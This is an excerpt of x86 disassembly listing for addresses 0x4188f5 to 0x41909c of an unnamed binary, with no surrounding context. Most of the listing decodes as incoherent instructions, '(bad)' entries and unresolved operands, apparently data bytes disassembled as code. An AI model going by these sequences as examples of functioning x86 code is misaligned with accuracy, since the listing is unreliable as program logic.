  4188f5:	cmp    ebp,0xffffffff
  4188f8:	xor    bh,BYTE PTR [edi-0x3]
  4188fb:	(bad)  
  4188fc:	jmp    0xfd83:0xfffd82
  418903:	call   eax
  418905:	cmp    ch,0xff
  418908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418909:	cmp    ch,0xff
  41890c:	or     BYTE PTR [ecx],cl
  41890e:	add    BYTE PTR [eax],al
  418910:	mov    bh,BYTE PTR [edi-0x3]
  418913:	inc    DWORD PTR [edx-0x35000281]
  418919:	cmp    ch,0xff
  41891c:	mov    al,BYTE PTR [edx-0x7d650003]
  418922:	std    
  418923:	push   esi
  418925:	cmp    ch,0xff
  418928:	fmul   DWORD PTR [eax]
  41892a:	add    BYTE PTR [eax],al
  41892c:	enter  0xfd7f,0xff
  418930:	enter  0x8,0x0
  418934:	cmp    BYTE PTR [edi-0x3],0xff
  418938:	cmp    BYTE PTR [edi-0x3],0xff
  41893c:	jl     0x4189bd
  41893e:	std    
  41893f:	push   DWORD PTR [ecx]
  418941:	call   0x8e4288ce
  418946:	cli    
  418947:	mov    bh,bh
  418949:	xchg   BYTE PTR [edx],bl
  41894b:	mov    edi,edi
  41894d:	jle    0x418959
  41894f:	mov    edi,edi
  418951:	jbe    0x4188fb
  418953:	mov    edi,edi
  418955:	outs   dx,BYTE PTR ds:[esi]
  418956:	fmul   DWORD PTR [ecx-0x756d9901]
  41895c:	call   FWORD PTR [esi-0x1e]
  41895f:	mov    edi,edi
  418961:	push   esi
  418962:	and    al,BYTE PTR [ecx]
  418964:	add    BYTE PTR [ecx],dh
  418966:	in     al,0x89
  418968:	inc    DWORD PTR [esi+0x22]
  41896b:	add    DWORD PTR [eax],eax
  41896d:	xor    eax,ecx
  41896f:	mov    edi,edi
  418971:	ss sub al,0x89
  418974:	jmp    FWORD PTR [esi]
  418976:	and    al,BYTE PTR [ecx]
  418978:	add    BYTE PTR [ecx],dh
  41897a:	push   edx
  41897b:	mov    edi,edi
  41897d:	push   ds
  41897e:	push   esi
  41897f:	mov    edi,edi
  418981:	push   ss
  418982:	push   0xffffff89
  418984:	dec    DWORD PTR [esi]
  418986:	jle    0x418911
  418988:	inc    DWORD PTR [esi]
  41898a:	ins    BYTE PTR es:[edi],dx
  41898b:	mov    edi,edi
  41898d:	(bad)  
  41898e:	xchg   edi,eax
  41898f:	mov    edi,edi
  418991:	mul    BYTE PTR [ecx]
  418993:	add    DWORD PTR [eax],eax
  418995:	xor    DWORD PTR [eax-0x44190078],esp
  41899b:	mov    edi,edi
  41899d:	fidiv  WORD PTR [ebx-0x76290075]
  4189a3:	mov    edi,?
  4189a5:	into   
  4189a6:	(bad)  
  4189a7:	mov    edi,?
  4189a9:	add    dh,al
  4189ab:	popa   
  4189ac:	mov    edi,?
  4189ae:	mov    esi,0xb6ff8c79
  4189b3:	(bad)  
  4189b4:	mov    edi,?
  4189b6:	scas   al,BYTE PTR es:[edi]
  4189b7:	xchg   edi,eax
  4189b8:	mov    edi,?
  4189ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189bb:	or     BYTE PTR [edi-0x18cc6174],cl
  4189c1:	add    esi,DWORD PTR [ecx]
  4189c3:	or     ecx,ebp
  4189c5:	mov    cl,BYTE PTR [esi-0x79750acd]
  4189cb:	xor    esp,edi
  4189cd:	add    esi,DWORD PTR [ecx]
  4189cf:	or     DWORD PTR [ebx-0x7ecc897a],ebx
  4189d5:	xchg   BYTE PTR [esi+0x33],ch
  4189d8:	jne    0x418960
  4189da:	xor    bp,bx
  4189dd:	test   BYTE PTR [esi+0x33],bl
  4189e0:	test   DWORD PTR [esi+edx*2+0x4e84f333],0x46850133
  4189eb:	xor    eax,DWORD PTR [ecx]
  4189ed:	test   DWORD PTR [esi],edi
  4189ef:	xor    esp,DWORD PTR [ebp-0x64ccc97c]
  4189f5:	test   BYTE PTR [esi],ch
  4189f7:	xor    eax,edi
  4189f9:	test   BYTE PTR [esi],ah
  4189fb:	xor    edx,DWORD PTR [ebx+0x69331e84]
  418a01:	test   DWORD PTR [esi],edx
  418a03:	xor    esi,DWORD PTR [ebp-0x7b]
  418a06:	push   cs
  418a07:	xor    edi,DWORD PTR [ebx]
  418a09:	test   DWORD PTR [esi],eax
  418a0b:	xor    ebp,DWORD PTR [ecx]
  418a0d:	test   DWORD PTR [eax],eax
  418a0f:	(bad)  
  418a10:	xor    bl,BYTE PTR [ecx]
  418a12:	test   esi,esi
  418a14:	xor    cl,BYTE PTR [ebx]
  418a16:	test   esi,ebp
  418a18:	xor    dh,bl
  418a1a:	test   dh,ah
  418a1c:	xor    ch,ch
  418a1e:	xchg   esi,ebx
  418a20:	xor    dh,ch
  418a22:	xchg   esi,edx
  418a24:	xor    al,BYTE PTR [ecx]
  418a26:	mov    dh,cl
  418a28:	xor    cl,BYTE PTR [edi]
  418a2a:	mov    dh,al
  418a2c:	xor    dh,BYTE PTR [ebx]
  418a2e:	mov    BYTE PTR [esi-0x4977b6ce],bh
  418a34:	xor    al,BYTE PTR [eax]
  418a36:	cmp    edi,DWORD PTR [ecx-0x46d002ce]
  418a3c:	xor    bh,ch
  418a3e:	xor    DWORD PTR [esi-0x51b202ce],0x32
  418a45:	std    
  418a46:	push   ebx
  418a47:	mov    dh,0x32
  418a49:	std    
  418a4a:	mov    ds:0xa5fd32ae,eax
  418a4f:	mov    dh,0x32
  418a51:	std    
  418a52:	xchg   ecx,eax
  418a53:	scas   al,BYTE PTR es:[edi]
  418a54:	xor    bh,ch
  418a56:	jno    0x418a0e
  418a58:	xor    bh,ch
  418a5a:	in     eax,0xaf
  418a5c:	xor    bh,ch
  418a5e:	add    DWORD PTR [esi-0x51ee02ce],esi
  418a64:	xor    bh,ch
  418a66:	adc    esi,DWORD PTR [esi-0x505c02ce]
  418a6c:	xor    bh,ch
  418a6e:	retf   
  418a6f:	mov    bh,0x32
  418a71:	std    
  418a72:	mov    edi,0xfd32af00
  418a77:	pop    edi
  418a78:	mov    bh,0x31
  418a7a:	std    
  418a7b:	jno    0x418a2c
  418a7d:	xor    ebp,edi
  418a7f:	cmp    DWORD PTR [edi-0x50ee02cf],esi
  418a85:	xor    ebp,edi
  418a87:	sbb    eax,0xe3fd31b7
  418a8c:	mov    eax,0xa8e3fd31
  418a91:	xor    ebp,edi
  418a93:	retf   
  418a94:	test   al,0x31
  418a96:	std    
  418a97:	mov    cl,0xb8
  418a99:	xor    ebp,edi
  418a9b:	mov    eax,ds:0x3ffd31b8
  418aa0:	mov    bh,0x31
  418aa2:	std    
  418aa3:	jmp    0x6b4193da
  418aa8:	mov    bh,0x31
  418aaa:	std    
  418aab:	jae    0x418a5c
  418aad:	xor    ebp,edi
  418aaf:	add    BYTE PTR [edx],bh
  418ab1:	mov    edi,ebp
  418ab3:	dec    DWORD PTR [edx-0x35000276]
  418ab9:	mov    bh,ch
  418abb:	jmp    FWORD PTR [esi-0x76]
  418abe:	std    
  418abf:	dec    DWORD PTR [eax-0x77fffffb]
  418ac5:	mov    bh,ch
  418ac7:	call   FWORD PTR [eax-0x7ffffffb]
  418acd:	mov    bh,ch
  418acf:	jmp    DWORD PTR [eax-0x76]
  418ad2:	std    
  418ad3:	push   DWORD PTR [edx+ecx*4+0x1200fffd]
  418ada:	mov    bh,ch
  418adc:	inc    DWORD PTR [eax-0x76]
  418adf:	std    
  418ae0:	inc    DWORD PTR [eax+0x50fffd8a]
  418ae6:	mov    bh,ch
  418ae8:	call   edx
  418aea:	mov    ebp,edi
  418aec:	inc    edx
  418aee:	mov    ebp,edi
  418af0:	(bad)  
  418af1:	mov    eax,0x8fffd89
  418af6:	mov    bh,ch
  418af8:	call   FWORD PTR [eax]
  418afa:	or     eax,0x88360000
  418aff:	std    
  418b00:	dec    DWORD PTR [eax]
  418b02:	or     eax,0x88520000
  418b07:	std    
  418b08:	call   DWORD PTR [esi]
  418b0a:	test   ebp,edi
  418b0c:	call   FWORD PTR [eax]
  418b0e:	or     eax,0x84b80000
  418b13:	std    
  418b14:	push   DWORD PTR [esp+eax*4-0x7b6f0003]
  418b1b:	std    
  418b1c:	(bad)  
  418b1d:	mov    esp,0x76fffd84
  418b22:	jge    0x418b21
  418b24:	inc    DWORD PTR [edx+0x31fffd7d]
  418b2a:	and    al,BYTE PTR [ecx]
  418b2c:	add    BYTE PTR [ecx],dh
  418b2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b2f:	mov    bh,bh
  418b31:	mov    esi,0xb6ff88b8
  418b36:	ror    BYTE PTR [eax-0x76755101],1
  418b3c:	inc    DWORD PTR [eax]
  418b3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b3f:	mov    ah,0x88
  418b41:	call   FWORD PTR [esi-0x6900769e]
  418b47:	jp     0x418ad2
  418b49:	dec    DWORD PTR [esi-0x7900768c]
  418b4f:	jl     0x418ada
  418b51:	(bad)  
  418b52:	jle    0x418aee
  418b54:	mov    edi,edi
  418b56:	jbe    0x418b7a
  418b58:	add    DWORD PTR [eax],eax
  418b5a:	xor    DWORD PTR [esp+ecx*4],esp
  418b5d:	jmp    DWORD PTR [esi+0x58]
  418b60:	mov    edi,?
  418b62:	pop    esi
  418b63:	and    al,BYTE PTR [ecx]
  418b65:	add    BYTE PTR [ecx],dh
  418b67:	or     eax,0x3cc34104
  418b6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b6d:	jae    0x418b3b
  418b6f:	lods   al,BYTE PTR ds:[si]
  418b71:	imul   edx,esp,0x60
  418b74:	add    DWORD PTR [edi],edi
  418b76:	xor    edx,DWORD PTR [eax+ebp*4-0x539f6aa2]
  418b7d:	imul   ecx,DWORD PTR [edx+eiz*1+0x63312101],0xffffffad
  418b85:	ins    BYTE PTR es:[edi],dx
  418b86:	mov    ds:0x9f5ec985,al
  418b8b:	jle    0x418b3a
  418b8d:	bound  esi,QWORD PTR [ecx]
  418b8f:	sbb    edi,edi
  418b91:	push   esp
  418b92:	sbb    DWORD PTR [ecx-0x66909d4b],0xffffffad
  418b99:	bound  esi,QWORD PTR [ecx]
  418b9b:	push   ebp
  418b9c:	add    ch,BYTE PTR [edx+eiz*2-0x4a]
  418ba0:	scas   al,BYTE PTR es:[edi]
  418ba1:	imul   eax,DWORD PTR [eax],0x54
  418ba4:	or     DWORD PTR [ebp-0x3d],edx
  418ba7:	(bad)  
  418ba8:	das    
  418ba9:	xchg   edi,eax
  418baa:	add    esi,DWORD PTR [ebp+ebx*4+0x45]
  418bae:	mov    ds:0xad1a9d67,al
  418bb3:	push   ecx
  418bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bb5:	out    0x3,al
  418bb7:	jl     0x418bc2
  418bb9:	es mov al,0x1d
  418bbc:	stos   DWORD PTR es:[edi],eax
  418bbd:	inc    edi
  418bbe:	mov    al,0x3
  418bc0:	lahf   
  418bc1:	cmp    ch,BYTE PTR [ebp+0x3e6a411]
  418bc7:	popf   
  418bc8:	or     DWORD PTR [ebx],ebp
  418bca:	lods   eax,DWORD PTR ds:[esi]
  418bcb:	adc    DWORD PTR [edx-0x59ff39fe],ebp
  418bd1:	add    eax,DWORD PTR [ecx+eax*4]
  418bd4:	or     DWORD PTR [ebx],esi
  418bd6:	lods   eax,DWORD PTR ds:[esi]
  418bd7:	adc    DWORD PTR [edx-0x63253cf6],ebp
  418bdd:	add    eax,0xd02f66a1
  418be2:	add    ch,cl
  418be4:	mov    ebx,0xb8d1b1da
  418be9:	ffreep st(2)
  418beb:	dec    esi
  418bec:	das    
  418bed:	cli    
  418bee:	add    ch,dl
  418bf0:	mov    ebx,0xa9d1b1d2
  418bf5:	mov    edx,0xd62f36c2
  418bfa:	add    dh,BYTE PTR [esp+eiz*4-0x46]
  418bfe:	lds    ecx,FWORD PTR [edi-0x5d3d3c63]
  418c04:	mov    ch,0x98
  418c06:	stos   BYTE PTR es:[edi],al
  418c07:	add    BYTE PTR [eax-0x7e596d4c],dl
  418c0d:	enter  0x3e6,0xaa
  418c11:	or     DWORD PTR [ebx+edi*4-0x586b5772],esp
  418c18:	jae    0x418bb9
  418c1a:	je     0x418bc6
  418c1c:	pusha  
  418c1d:	sahf   
  418c1e:	inc    DWORD PTR [esi+0x756dab97]
  418c24:	add    DWORD PTR [ebx-0x5a78af8f],edi
  418c2a:	jo     0x418c54
  418c2c:	xor    eax,0x8e2dff0d
  418c31:	mov    edx,0xab814045
  418c36:	push   eax
  418c37:	push   eax
  418c38:	jnp    0x418be5
  418c3a:	(bad)  
  418c3b:	(bad)  
  418c3c:	xor    cl,al
  418c3e:	jno    0x418c8c
  418c40:	sar    BYTE PTR [edx-0x5d35d89e],cl
  418c46:	bound  esi,QWORD PTR [edx+edx*8]
  418c49:	sahf   
  418c4a:	outs   dx,DWORD PTR ds:[esi]
  418c4b:	adc    bh,bl
  418c4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c4e:	ds jmp 0x1c439586
  418c54:	rcr    BYTE PTR [esi-0x4a31efab],cl
  418c5a:	dec    esp
  418c5b:	pop    es
  418c5c:	ja     0x418c05
  418c5e:	imul   ecx,DWORD PTR [ebp*1-0x70ebfda8],0xffffffa3
  418c66:	pop    esi
  418c67:	fnstcw WORD PTR [edi+eiz*4+0x62]
  418c6b:	(bad)  
  418c6c:	add    BYTE PTR [ebp-0x5c],bh
  418c6f:	inc    ebp
  418c70:	rcl    BYTE PTR [esi+0x3342ffab],0xbd
  418c77:	ins    BYTE PTR es:[edi],dx
  418c78:	enter  0xc28e,0x66
  418c7c:	retf   
  418c7d:	loopne 0x418c4d
  418c7f:	jno    0x418c31
  418c81:	repz sub eax,0xc4339afd
  418c87:	bound  ebx,QWORD PTR [ebp-0x759347fe]
  418c8d:	repz test eax,0xb8cf9b63
  418c93:	jo     0x418c7e
  418c95:	xor    al,BYTE PTR [ebp+0x66c7ffff]
  418c9b:	jno    0x418cf1
  418c9d:	mov    ch,0x5e
  418c9f:	ins    DWORD PTR es:[edi],dx
  418ca0:	push   eax
  418ca1:	mov    ecx,0xc8416575
  418ca6:	or     DWORD PTR [ecx],esi
  418ca8:	add    BYTE PTR [ebx],cl
  418caa:	ja     0x418d0e
  418cac:	popa   
  418cad:	fs push 0x686a6941
  418cb3:	pusha  
  418cb4:	je     0x418cb5
  418cb6:	jbe    0x418d2e
  418cb8:	inc    ecx
  418cb9:	enter  0x6509,0x0
  418cbd:	push   esp
  418cbe:	push   0x68646569
  418cc3:	inc    ebx
  418cc4:	imul   ebx,DWORD PTR [eax+ebp*2+0x3e],0x43048800
  418ccc:	gs and al,0x46
  418ccf:	jb     0x418d43
  418cd1:	add    BYTE PTR [edx],ch
  418cd3:	push   0x7738746b
  418cd8:	ins    BYTE PTR es:[edi],dx
  418cd9:	arpl   WORD PTR ds:0xe8007076,sp
  418cdf:	push   es
  418ce0:	push   ebx
  418ce1:	imul   esi,DWORD PTR [eax+ebp*2],0x77296840
  418ce8:	push   ecx
  418ce9:	outs   dx,DWORD PTR ds:[esi]
  418cea:	popf   
  418ceb:	js     0x418d56
  418ced:	je     0x418d50
  418cef:	inc    ebx
  418cf0:	jbe    0x418d66
  418cf2:	jne    0x418cfd
  418cf4:	sub    BYTE PTR [ecx],al
  418cf6:	xchg   edi,eax
  418cf7:	push   0x76694c71
  418cfc:	jno    0x418d43
  418cfe:	jmp    0x1109:0x18726c76
  418d05:	add    ebx,esp
  418d07:	jae    0x418d7a
  418d09:	jb     0x418cb6
  418d0b:	popa   
  418d0c:	ins    DWORD PTR es:[edi],dx
  418d0d:	inc    ecx
  418d0e:	sbb    BYTE PTR [ecx],cl
  418d10:	push   ebp
  418d11:	add    BYTE PTR [ecx],dh
  418d13:	pop    edi
  418d14:	mov    bl,0x62
  418d16:	nop
  418d17:	xchg   esi,eax
  418d18:	mov    al,ds:0xa5938653
  418d1d:	addr16 push esp
  418d1f:	jle    0x418cd2
  418d21:	xor    BYTE PTR [ebx],ah
  418d23:	(bad)  
  418d24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d25:	pop    esi
  418d26:	popa   
  418d27:	scas   eax,DWORD PTR es:[edi]
  418d28:	test   al,0x6c
  418d2a:	pop    ebp
  418d2b:	and    al,BYTE PTR [ecx]
  418d2d:	and    esi,DWORD PTR [ebx]
  418d2f:	repnz mov ch,0x6c
  418d32:	push   edx
  418d33:	mov    ebp,0x20070b4
  418d38:	adc    dl,al
  418d3a:	inc    bx
  418d3c:	out    dx,eax
  418d3d:	scas   eax,DWORD PTR es:[edi]
  418d3e:	jmp    FWORD PTR [esi+0x214d032a]
  418d44:	mov    ebp,0xeb234fa9
  418d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d4a:	bound  esp,QWORD PTR [edx]
  418d4c:	(bad)  
  418d4e:	and    eax,0x6cb5f233
  418d53:	adc    bh,ch
  418d55:	mov    ah,0x70
  418d57:	inc    edx
  418d58:	push   eax
  418d59:	(bad)  
  418d5a:	(bad)  
  418d5b:	stc    
  418d5c:	sub    eax,0xe431af01
  418d61:	stos   BYTE PTR es:[edi],al
  418d62:	ins    DWORD PTR es:[edi],dx
  418d63:	int    0xdb
  418d65:	stos   BYTE PTR es:[edi],al
  418d66:	jno    0x418d4a
  418d68:	xor    eax,0x3cc566bf
  418d6d:	(bad)  
  418d6e:	dec    DWORD PTR [esi+0x33]
  418d71:	push   es
  418d72:	ins    BYTE PTR es:[edi],dx
  418d73:	ret    0xb34d
  418d76:	pusha  
  418d77:	int3   
  418d78:	push   ecx
  418d79:	lods   al,BYTE PTR ds:[esi]
  418d7a:	xor    DWORD PTR ds:[eax+0x3c984601],ecx
  418d81:	popf   
  418d82:	dec    ebp
  418d83:	mov    WORD PTR [edx-0x53],?
  418d86:	inc    ebp
  418d87:	mov    BYTE PTR [esi-0x60],ch
  418d8a:	xor    DWORD PTR ds:[ecx],ecx
  418d8d:	push   esp
  418d8e:	add    esi,DWORD PTR [edi-0x5e]
  418d91:	mov    WORD PTR [edi-0x497a628f],ds
  418d97:	xchg   ebx,eax
  418d98:	or     ebx,edx
  418d9a:	add    al,0x0
  418d9c:	ins    BYTE PTR es:[edi],dx
  418d9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d9e:	jp     0x418d68
  418da0:	pop    ebp
  418da1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418da2:	jae    0x418d4b
  418da4:	push   ebx
  418da5:	rol    DWORD PTR [edi-0x7c62ad57],0xc4
  418dac:	(bad)  
  418dad:	sub    edi,DWORD PTR [ebp+0x3]
  418db0:	je     0x418d58
  418db2:	push   edx
  418db3:	rcl    BYTE PTR [ebx-0x49],cl
  418db6:	pop    ecx
  418db7:	stos   DWORD PTR es:[edi],eax
  418db8:	dec    ebp
  418db9:	fwait
  418dba:	and    edi,DWORD PTR [edi+esi*8-0xbfceef8]
  418dc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dc2:	xor    cl,al
  418dc4:	adc    eax,0x13a847a8
  418dc9:	ret    0xa23c
  418dcc:	add    eax,0x503e6ca
  418dd1:	or     ah,BYTE PTR [esi]
  418dd3:	lahf   
  418dd4:	add    bl,al
  418dd6:	lgs    eax,FWORD PTR [edx]
  418dd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dda:	sti    
  418ddb:	retf   0xa304
  418dde:	adc    eax,0x26099104
  418de3:	lahf   
  418de4:	loop   0x418db9
  418de6:	jmp    FWORD PTR [ecx-0x4b0a642e]
  418dec:	repnz mov eax,ds:0xb4d19ed8
  418df2:	int    0xb5
  418df4:	mov    edi,0xec03e6c9
  418df9:	or     DWORD PTR [esi-0x47273d62],esp
  418dff:	stos   BYTE PTR es:[edi],al
  418e00:	add    BYTE PTR [eax+ebp*4-0x4889614e],ah
  418e07:	inc    ebp
  418e09:	shl    BYTE PTR [ebx-0x49023b95],1
  418e0f:	jno    0x418da1
  418e11:	fsub   DWORD PTR [ebp-0x50cd16c2]
  418e17:	add    DWORD PTR [edx-0x6bbf4961],edi
  418e1d:	mov    esp,0x9e9762b8
  418e22:	(bad)  
  418e23:	data16 jnp 0x418ded
  418e26:	test   eax,0xb3a48673
  418e2b:	ds jmp 0x2e404b63
  418e31:	scas   al,BYTE PTR es:[edi]
  418e32:	mov    dh,0x4f
  418e34:	pop    ebx
  418e35:	call   0x71ba:0x9e5d5eb4
  418e3c:	ds xchg ebx,eax
  418e3e:	mov    ds:0xa7844c6b,eax
  418e43:	pusha  
  418e44:	xor    eax,0x276d9dda
  418e49:	rcr    BYTE PTR [edi+0x2a723a62],cl
  418e4f:	std    
  418e50:	xor    BYTE PTR [edx],dh
  418e52:	les    esp,FWORD PTR [edx+0x15]
  418e55:	pop    ebp
  418e56:	mov    eax,0xb6d21f66
  418e5b:	bound  edi,QWORD PTR [ecx]
  418e5d:	mov    edi,0x9910659d
  418e62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e63:	inc    esi
  418e64:	verr   WORD PTR [ecx+0x3276ffeb]
  418e6b:	les    esp,FWORD PTR [edx-0xb]
  418e6e:	ins    DWORD PTR es:[edi],dx
  418e6f:	mov    bh,0x71
  418e71:	fld    TBYTE PTR [edi-0x645a8c64]
  418e77:	mov    eax,0x9d8eca62
  418e7c:	jno    0x418e4e
  418e7e:	jae    0x418eaa
  418e80:	std    
  418e81:	add    BYTE PTR [esi],dl
  418e83:	add    eax,0x73dc736c
  418e88:	imul   esp,DWORD PTR [ebp-0xa],0xf5fffd58
  418e8f:	add    ecx,DWORD PTR [ecx+0x75]
  418e92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e93:	pop    ecx
  418e94:	inc    dx
  418e96:	rcr    DWORD PTR [ecx+0x62],1
  418e99:	push   esp
  418e9a:	mov    bh,0x58
  418e9c:	lods   ax,WORD PTR fs:[esi]
  418e9f:	inc    esp
  418ea0:	gs popa 
  418ea2:	push   0x6
  418ea4:	mov    DWORD PTR [ecx],eax
  418ea6:	(bad)
  418eaa:	mov    cl,0x64
  418eac:	push   0x6b5b5743
  418eb1:	je     0x418e8b
  418eb3:	add    eax,0x610b02b7
  418eb8:	bound  esp,QWORD PTR [ebp+0x58]
  418ebb:	add    eax,0x680f0132
  418ec0:	jno    0x418f0f
  418ec2:	pop    es
  418ec3:	imul   esi,DWORD PTR [edx+0x6c],0x6c666aed
  418eca:	add    ch,ch
  418ecc:	inc    edx
  418ecd:	pop    esi
  418ece:	ins    DWORD PTR es:[edi],dx
  418ecf:	in     eax,dx
  418ed0:	inc    ebx
  418ed1:	std    
  418ed2:	(bad)  
  418ed3:	mov    edi,0x55434c03
  418ed8:	fs ins DWORD PTR es:[edi],dx
  418eda:	push   ebx
  418edb:	sbb    al,0x77
  418edd:	data16 outs dx,BYTE PTR ds:[esi]
  418edf:	das    
  418ee0:	inc    esp
  418ee1:	std    
  418ee2:	call   ebx
  418ee4:	add    al,0x41
  418ee6:	js     0x418f29
  418ee8:	jns    0x418f37
  418eea:	jb     0x418f23
  418eec:	bound  si,DWORD PTR [ebx+0x5b]
  418ef0:	add    eax,0x688b02ad
  418ef5:	jno    0x418f4c
  418ef7:	jbe    0x418f56
  418ef9:	pop    esi
  418efa:	outs   dx,BYTE PTR ds:[esi]
  418efb:	xor    DWORD PTR [eiz*4-0x469b329e],edi
  418f02:	pusha  
  418f03:	xchg   esp,eax
  418f04:	bound  ebp,QWORD PTR [ebp-0x44a7699a]
  418f0a:	lea    sp,[esi-0x60]
  418f0e:	jno    0x418f41
  418f10:	dec    ebx
  418f11:	mov    al,ds:0xa5959f71
  418f16:	xor    BYTE PTR [ebx+0x58],al
  418f19:	popf   
  418f1a:	imul   ecx,DWORD PTR [ebp+0x31890132],0x73
  418f21:	scas   eax,DWORD PTR es:[edi]
  418f22:	bound  edx,QWORD PTR [eax-0x5a]
  418f25:	lahf   
  418f26:	push   eax
  418f27:	pop    ebp
  418f28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f29:	lahf   
  418f2a:	pop    esi
  418f2b:	dec    esp
  418f2c:	outs   dx,DWORD PTR ds:[esi]
  418f2d:	mov    ds:0xa66e0047,eax
  418f32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f33:	popa   
  418f34:	push   eax
  418f35:	mov    esi,0xef319503
  418f3a:	sahf   
  418f3b:	jae    0x418fa6
  418f3d:	mul    DWORD PTR [edi-0x582eac94]
  418f43:	inc    ebp
  418f44:	and    edi,DWORD PTR [edi-0x1be2af5a]
  418f4a:	sahf   
  418f4b:	pop    esi
  418f4c:	or     al,0x32
  418f4e:	add    DWORD PTR [esi],ecx
  418f50:	xor    ebx,esi
  418f52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f53:	inc    eax
  418f54:	add    edx,DWORD PTR ds:0xef0c73a3
  418f5a:	scas   al,BYTE PTR es:[edi]
  418f5b:	adc    ax,0x132
  418f5f:	pusha  
  418f60:	xor    ebx,esi
  418f62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f63:	push   ebx
  418f64:	shl    BYTE PTR [edx],1
  418f66:	stos   BYTE PTR es:[edi],al
  418f67:	dec    edx
  418f68:	int3   
  418f69:	adc    al,0xbe
  418f6b:	jno    0x418f41
  418f6d:	adc    al,0x4
  418f6f:	or     eax,0x40a4f331
  418f74:	ret    
  418f75:	or     ah,cl
  418f77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f78:	ret    0xafad
  418f7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f7c:	rcr    DWORD PTR [edi+eax*8-0x19522e5b],0x3
  418f84:	and    BYTE PTR [ecx],cl
  418f86:	mov    dh,0xa7
  418f88:	xchg   ebx,eax
  418f89:	ror    ah,cl
  418f8b:	lods   al,BYTE PTR ds:[esi]
  418f8c:	mov    ds:0x8fa7c7b2,al
  418f91:	mov    ds:0x9c0003c3,eax
  418f96:	mov    ch,0x8b
  418f98:	repnz inc eax
  418f9a:	test   DWORD PTR [edx-0x6bf67559],0x969c7c01
  418fa4:	mov    cl,0x57
  418fa6:	mov    bh,0x7a
  418fa8:	popf   
  418fa9:	daa    
  418faa:	or     DWORD PTR [edx+esi*4+0x53],esi
  418fae:	fwait
  418faf:	mov    ecx,0x7aad04f1
  418fb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fb5:	into   
  418fb6:	daa    
  418fb7:	mov    bh,0x3
  418fb9:	arpl   WORD PTR [esi-0x51b13abb],bp
  418fbf:	inc    esp
  418fc0:	leave  
  418fc1:	push   ebx
  418fc2:	mov    ds:0x96fbc23,al
  418fc7:	mov    eax,ds:0x45ae0303
  418fcc:	shl    DWORD PTR [ebx],cl
  418fce:	scas   al,BYTE PTR es:[edi]
  418fcf:	cmp    BYTE PTR [ebx-0x50c55604],bh
  418fd5:	adc    ecx,esi
  418fd7:	push   ds
  418fd8:	ret    
  418fd9:	xchg   BYTE PTR [edi],ah
  418fdb:	push   esi
  418fdc:	add    esp,ebx
  418fde:	lods   eax,DWORD PTR ds:[esi]
  418fdf:	or     eax,0x19b80ac1
  418fe4:	lahf   
  418fe5:	stc    
  418fe6:	lods   eax,DWORD PTR ds:[esi]
  418fe7:	inc    DWORD PTR [ebx]
  418fe9:	je     0x418ff4
  418feb:	sbb    DWORD PTR [edi-0x700282b],ebx
  418ff1:	mov    bh,0xb5
  418ff3:	dec    eax
  418ff4:	add    al,0x8a
  418ff6:	out    0xff,al
  418ff8:	sub    al,0x0
  418ffa:	xor    bh,BYTE PTR [ebx-0x4a80399e]
  419000:	jb     0x418fc6
  419002:	imul   ebp,DWORD PTR [edx-0x18155b8a],0xbb3282ff
  41900c:	(bad)  
  41900d:	(bad)  
  41900e:	icebp  
  41900f:	cwde   
  419010:	(bad)  
  419011:	enter  0xabc6,0x48
  419015:	(bad)  
  419016:	retf   
  419017:	out    0xff,eax
  419019:	or     eax,0x8662bb32
  41901e:	loope  0x418fcb
  419020:	jae    0x418fe1
  419022:	shl    DWORD PTR [edx-0x61507b8e],cl
  419028:	ds jmp 0xb0408260
  41902e:	mov    eax,ds:0x867162ba
  419033:	mov    ebx,0xb591806d
  419038:	arpl   WORD PTR [ebp+ebp*1+0x57],cx
  41903c:	(bad)  
  41903d:	cmp    bl,BYTE PTR [esi-0x69a6b353]
  419043:	mov    ah,0x40
  419045:	push   esp
  419046:	jecxz  0x418fe0
  419048:	bound  edx,QWORD PTR [edi-0x1f]
  41904b:	mov    ebx,0x26e34470
  419050:	std    
  419051:	scas   al,BYTE PTR es:[edi]
  419052:	xor    edi,DWORD PTR [ebx-0x4b31b99e]
  419058:	jb     0x41906e
  41905a:	ja     0x419023
  41905c:	imul   edx,DWORD PTR [eax+eax*1],0xffffff9e
  419060:	out    0xff,eax
  419062:	icebp  
  419063:	xor    ecx,esp
  419065:	bound  edx,QWORD PTR ds:0x62997e
  41906b:	push   0x4c
  41906d:	pop    esi
  41906e:	ins    DWORD PTR es:[edi],dx
  41906f:	xor    eax,0x29fffd4a
  419074:	imul   esi,DWORD PTR [ebx+0x61],0x32307348
  41907b:	push   ds
  41907c:	imul   ebp,DWORD PTR [ecx+0x6c],0xd50a48
  419083:	jnp    0x4190f7
  419085:	bound  ebp,QWORD PTR [esp+ebp*8+0x66]
  419089:	jne    0x4190f0
  41908b:	sti    
  41908c:	jbe    0x4190ff
  41908e:	gs leave 
  419090:	or     DWORD PTR [edi+0x68],ebp
  419093:	in     eax,0x6d
  419095:	imul   esi,DWORD PTR [ebx],0x6c612c0a
  41909b:	pushf  
  41909c:	or     DWORD PTR [ebp+0x0],esi
